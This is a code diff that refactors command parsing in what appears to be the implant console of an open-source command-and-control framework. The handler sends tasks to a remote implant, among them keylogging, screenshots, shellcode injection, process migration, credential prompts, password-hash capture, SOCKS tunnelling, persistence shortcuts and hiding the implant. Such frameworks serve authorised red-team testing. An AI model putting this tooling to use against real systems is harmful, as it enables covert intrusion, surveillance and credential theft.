@@ -11,6 +11,10 @@ from Utils import argp, load_file, gen_key
 
 
 def handle_sharp_command(command, user, randomuri, startup):
+
+    original_command = command
+    command = command.lower().strip()
+
     try:
         check_module_loaded("Stage2-Core.exe", randomuri, user)
     except Exception as e:
@@ -18,28 +22,28 @@ def handle_sharp_command(command, user, randomuri, startup):
 
     # alias mapping
     for alias in cs_alias:
-        if alias[0] == command.lower()[:len(command.rstrip())]:
+        if alias[0] == command[:len(command.rstrip())]:
             command = alias[1]
 
     # alias replace
     for alias in cs_replace:
-        if command.lower().strip().startswith(alias[0]):
+        if command.startswith(alias[0]):
             command = command.replace(alias[0], alias[1])
 
     run_autoloads_sharp(command, randomuri, user)
 
-    if "searchhelp" in command.lower():
-        searchterm = (command.lower()).replace("searchhelp ", "")
+    if command.startswith("searchhelp"):
+        searchterm = (command).replace("searchhelp ", "")
         helpful = sharp_help1.split('\n')
         for line in helpful:
             if searchterm in line.lower():
                 print(line)
 
-    elif "upload-file" in command.lower():
+    elif command.startswith("upload-file"):
         source = ""
         destination = ""
         s = ""
-        if command.strip().lower() == "upload-file":
+        if command == "upload-file":
             source = readfile_with_completion("Location of file to upload: ")
             while not os.path.isfile(source):
                 print("File does not exist: %s" % source)
@@ -65,17 +69,17 @@ def handle_sharp_command(command, user, randomuri, startup):
             print("Error with source file: %s" % e)
             traceback.print_exc()
 
-    elif "unhide-implant" in command.lower():
+    elif command.startswith("unhide-implant"):
         unhide_implant(randomuri)
 
-    elif "hide-implant" in command.lower():
+    elif command.startswith("hide-implant"):
         kill_implant(randomuri)
 
-    elif "safetydump" in command.lower():
+    elif command.startswith("safetydump"):
         check_module_loaded("SafetyDump.exe", randomuri, user)
         new_task(command, user, randomuri)
 
-    elif "inject-shellcode" in command.lower():
+    elif command.startswith("inject-shellcode"):
         params = re.compile("inject-shellcode", re.IGNORECASE)
         params = params.sub("", command)
         path = shellcodereadfile_with_completion("Location of shellcode file: ")
@@ -86,12 +90,12 @@ def handle_sharp_command(command, user, randomuri, startup):
         except Exception as e:
             print("Error loading file: %s" % e)
 
-    elif "migrate" in command.lower():
+    elif command.startswith("migrate"):
         params = re.compile("migrate", re.IGNORECASE)
         params = params.sub("", command)
         migrate(randomuri, user, params)
 
-    elif "kill-implant" in command.lower() or "exit" in command.lower():
+    elif command == "kill-implant" or command == "exit":
         impid = get_implantdetails(randomuri)
         ri = input("Are you sure you want to terminate the implant ID %s? (Y/n) " % impid[0])
         if ri.lower() == "n":
@@ -103,7 +107,7 @@ def handle_sharp_command(command, user, randomuri, startup):
             new_task("exit", user, randomuri)
             kill_implant(randomuri)
 
-    elif (command.lower() == "sharpsocks") or (command.lower() == "sharpsocks "):
+    elif command == "sharpsocks":
         from random import choice
         allchar = string.ascii_letters
         channel = "".join(choice(allchar) for x in range(25))
@@ -120,88 +124,88 @@ def handle_sharp_command(command, user, randomuri, startup):
         if ri.lower() == "y":
             new_task("run-exe SharpSocksImplantTestApp.Program SharpSocks -s %s -c %s -k %s -url1 %s -url2 %s -b 2000 --session-cookie ASP.NET_SessionId --payload-cookie __RequestVerificationToken" % (sharpurl, channel, sharpkey, sharpurls[0].replace("\"", ""), sharpurls[1].replace("\"", "")), user, randomuri)
 
-    elif "seatbelt " in command.lower():
+    elif command.startswith("seatbelt"):
         check_module_loaded("Seatbelt.exe", randomuri, user)
         new_task(command, user, randomuri)
 
-    elif (command.lower().startswith("stop-keystrokes")):
+    elif (command.startswith("stop-keystrokes")):
         new_task("run-exe Core.Program Core %s" % command, user, randomuri)
 
-    elif (command.lower().startswith("get-keystrokes")):
+    elif (command.startswith("get-keystrokes")):
         new_task("run-exe Core.Program Core %s" % command, user, randomuri)
 
-    elif (command.lower().startswith("get-screenshotmulti")):
+    elif (command.startswith("get-screenshotmulti")):
         new_task(command, user, randomuri)
 
-    elif (command.lower().startswith("create-lnk")):
+    elif (command.startswith("create-lnk")):
         new_task("run-exe Core.Program Core %s" % command, user, randomuri)
 
-    elif (command.lower().startswith("create-startuplnk")):
+    elif (command.startswith("create-startuplnk")):
         new_task("run-exe Core.Program Core %s" % command, user, randomuri)
 
-    elif (command.lower().startswith("get-screenshot")):
+    elif (command.startswith("get-screenshot")):
         new_task("run-exe Core.Program Core %s" % command, user, randomuri)
 
-    elif (command.lower().startswith("get-hash")):
+    elif (command.startswith("get-hash")):
         check_module_loaded("InternalMonologue.exe", randomuri, user)
         new_task("run-exe InternalMonologue.Program InternalMonologue", user, randomuri)
 
-    elif (command.lower().startswith("arpscan")):
+    elif (command.startswith("arpscan")):
         new_task("run-exe Core.Program Core %s" % command, user, randomuri)
 
-    elif (command.lower().startswith("testadcredential")):
+    elif (command.startswith("testadcredential")):
         new_task("run-exe Core.Program Core %s" % command, user, randomuri)
 
-    elif (command.lower().startswith("testlocalcredential")):
+    elif (command.startswith("testlocalcredential")):
         new_task("run-exe Core.Program Core %s" % command, user, randomuri)
 
-    elif (command.lower().startswith("turtle")):
+    elif (command.startswith("turtle")):
         new_task("run-exe Core.Program Core %s" % command, user, randomuri)
 
-    elif (command.lower().startswith("get-userinfo")):
+    elif (command.startswith("get-userinfo")):
         new_task("run-exe Core.Program Core %s" % command, user, randomuri)
 
-    elif (command.lower().startswith("get-content")):
+    elif (command.startswith("get-content")):
         new_task("run-exe Core.Program Core %s" % command, user, randomuri)
 
-    elif (command.lower().startswith("resolvednsname")):
+    elif (command.startswith("resolvednsname")):
         new_task("run-exe Core.Program Core %s" % command, user, randomuri)
 
-    elif (command.lower().startswith("resolveip")):
+    elif (command.startswith("resolveip")):
         new_task("run-exe Core.Program Core %s" % command, user, randomuri)
 
-    elif (command.lower().startswith("cred-popper")):
+    elif (command.startswith("cred-popper")):
         new_task("run-exe Core.Program Core %s" % command, user, randomuri)
 
-    elif (command.lower().startswith("get-serviceperms")):
+    elif (command.startswith("get-serviceperms")):
         new_task("run-exe Core.Program Core %s" % command, user, randomuri)
 
-    elif (command.lower().startswith("move")):
+    elif (command.startswith("move ")):
         new_task("run-exe Core.Program Core %s" % command, user, randomuri)
 
-    elif (command.lower().startswith("delete")):
+    elif (command.startswith("delete ")):
         new_task("run-exe Core.Program Core %s" % command, user, randomuri)
 
-    elif (command.lower().startswith("ls")):
+    elif command == "ls":
         new_task("run-exe Core.Program Core %s" % command, user, randomuri)
 
-    elif (command.lower() == "pwd") or (command.lower() == "pwd "):
+    elif command == "pwd":
         new_task("run-exe Core.Program Core pwd", user, randomuri)
 
-    elif (command.lower() == "ps") or (command.lower() == "ps "):
+    elif command == "ps":
         new_task("run-exe Core.Program Core Get-ProcessList", user, randomuri)
 
-    elif "loadmoduleforce" in command.lower():
+    elif command.startswith("loadmoduleforce"):
         params = re.compile("loadmoduleforce ", re.IGNORECASE)
         params = params.sub("", command)
         check_module_loaded(params, randomuri, user, force=True)
 
-    elif "loadmodule" in command.lower():
+    elif command.startswith("loadmodule"):
         params = re.compile("loadmodule ", re.IGNORECASE)
         params = params.sub("", command)
         check_module_loaded(params, randomuri, user)
 
-    elif "listmodules" in command.lower():
+    elif command.startswith("listmodules"):
         modules = os.listdir("%s/Modules/" % POSHDIR)
         print("")
         print("[+] Available modules:")
@@ -211,17 +215,17 @@ def handle_sharp_command(command, user, randomuri, startup):
                 print(mod)
         new_task(command, user, randomuri)
 
-    elif "modulesloaded" in command.lower():
+    elif command.startswith("modulesloaded"):
         ml = get_implantdetails(randomuri)
         print(ml[14])
 
-    elif command.lower() == "help" or command == "?" or command.lower() == "help ":
+    elif command == "help" or command == "?":
         print(sharp_help1)
 
-    elif (command == "back") or (command == "clear") or (command == "back ") or (command == "clear "):
+    elif command == "back" or command == "clear":
         startup(user)
 
-    elif ('beacon' in command.lower() and '-beacon' not in command.lower()) or 'set-beacon' in command.lower() or 'setbeacon' in command.lower():
+    elif command.startswith("beacon") or command.startswith("set-beacon") or command.startswith("setbeacon"):
         new_sleep = command.replace('set-beacon ', '')
         new_sleep = new_sleep.replace('setbeacon ', '')
         new_sleep = new_sleep.replace('beacon ', '').strip()
@@ -233,14 +237,14 @@ def handle_sharp_command(command, user, randomuri, startup):
             new_task(command, user, randomuri)
             update_sleep(new_sleep, randomuri)
 
-    elif (command.lower().startswith('label-implant')):
+    elif (command.startswith('label-implant')):
         label = command.replace('label-implant ', '')
         update_label(label, randomuri)
         startup(user)
 
     else:
         if command:
-            new_task(command, user, randomuri)
+            new_task(original_command, user, randomuri)
         return
 
 
